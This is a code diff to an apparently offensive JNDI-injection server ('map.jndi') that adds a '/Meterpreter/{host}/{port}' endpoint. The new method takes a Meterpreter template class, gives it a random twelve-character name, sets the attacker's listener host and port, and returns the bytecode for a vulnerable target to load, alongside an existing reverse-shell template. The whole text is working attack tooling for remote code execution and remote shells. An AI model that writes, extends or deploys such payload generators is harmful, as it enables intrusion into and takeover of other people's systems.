@@ -4,6 +4,7 @@ import map.jndi.Config;
 import map.jndi.annotation.JNDIController;
 import map.jndi.annotation.JNDIMapping;
 import map.jndi.server.WebServer;
+import map.jndi.template.Meterpreter;
 import map.jndi.template.ReverseShellTemplate;
 import map.jndi.util.MiscUtil;
 import map.jndi.util.ReflectUtil;
@@ -104,6 +105,21 @@ public class BasicController implements Controller {
 
         ReflectUtil.setCtField(clazz, "host", CtField.Initializer.constant(host));
         ReflectUtil.setCtField(clazz, "port", CtField.Initializer.constant(Integer.parseInt(port)));
+
+        return clazz.toBytecode();
+    }
+
+    @JNDIMapping("/Meterpreter/{host}/{port}")
+    public byte[] meterpreter(String host, String port) throws Exception {
+        System.out.println("[Meterpreter]: Host: " + host + " Port: " + port);
+
+        String className = MiscUtil.getRandStr(12);
+        ClassPool pool = ClassPool.getDefault();
+        CtClass clazz = pool.get(Meterpreter.class.getName());
+        clazz.replaceClassName(clazz.getName(), className);
+
+        ReflectUtil.setCtField(clazz, "lHost", CtField.Initializer.constant(host));
+        ReflectUtil.setCtField(clazz, "lPort", CtField.Initializer.constant(Integer.parseInt(port)));
 
         return clazz.toBytecode();
     }
